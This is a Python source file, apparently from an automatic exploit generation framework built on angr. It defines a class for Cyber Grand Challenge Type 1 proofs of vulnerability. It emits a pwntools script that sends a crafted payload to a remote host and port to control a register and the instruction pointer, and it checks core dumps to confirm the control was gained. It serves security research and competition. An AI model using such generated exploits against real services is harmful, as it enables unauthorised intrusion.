import angr
from .cgc_exploit import CGCExploit

import logging

l = logging.getLogger("rex.exploit.cgc.cgc_type1_exploit")

class CGCType1Exploit(CGCExploit):
    '''
    A CGC exploit object, offers more flexibility than an Exploit object for the sake of the game.
    This should represent a Type 1 POV by allowing you to set many different registers to many different values.
    https://github.com/CyberGrandChallenge/cgc-release-documentation/blob/master/walk-throughs/understanding-cfe-povs.md
    '''

    def __init__(self, crash, register, bypasses_nx, bypasses_aslr):
        '''
        :param crash: a crash object which has been modified to exploit a vulnerability
        '''
        super(CGCType1Exploit, self).__init__(crash, 1, bypasses_nx, bypasses_aslr)

        self.register = register
        self.value_idx = None
        self.final_ip_idx = None
        self._raw_payload = None

    def dump_python(self, filename=None):
        '''
        dump an exploit in the form of a python script
        '''

        payload = """import sys
import time
from pwn import *

if len(sys.argv) < 5:
    print "%s: <host> <port> <value> <final_ip>" % sys.argv[0]
    sys.exit(1)

r = remote(sys.argv[1], sys.argv[2])

value = int(sys.argv[3], 16)
final_ip = int(sys.argv[4], 16)

b = bytearray(\"""" + self._raw_payload.encode('hex') + """\".decode('hex'))
b[""" + str(self.value_idx) + ":" + str(self.value_idx + 4) + """] = p32(value)
b[""" + str(self.final_ip_idx) + ":" + str(self.final_ip_idx + 4) + """] = p32(final_ip)

r.send(b)
"""

        if not filename is None:
            with open(filename, 'w') as f:
                f.write(payload)
        else:
            return payload

    def _prepare_test(self):
        '''
        Prepare a test exploit string which should set the register to 'AAAA' and PC to 'BBBB'

        :return: string which exploits the target binary
        '''

        b = bytearray(self._raw_payload)

        b[self.value_idx:self.value_idx + 4] = 'AAAA'
        b[self.final_ip_idx:self.final_ip_idx + 4] = 'BBBB'

        return str(b)

    def _check_core(self, core_file):
        '''
        Test a core file to see if it properly set up the registers, aka the exploit succeeded.
        '''

        p = angr.Project(core_file)

        register_val = None
        ip_val = None
        for reg, val in p.loader.main_bin.initial_register_values():
            if reg == self.register:
                l.debug("got register value of %#x for register %s", val, reg)
                register_val = val
            if reg == "eip":
                l.debug("got register value of %#x for register %s", val, reg)
                ip_val = val

        assert ip_val is not None, "eip's value not found in core file"
        assert register_val is not None, "%s's value not found in core file" % self.register

        # register should be set to 'AAAA' and ip should be set to 'BBBB'
        return register_val == 0x41414141 and ip_val == 0x42424242
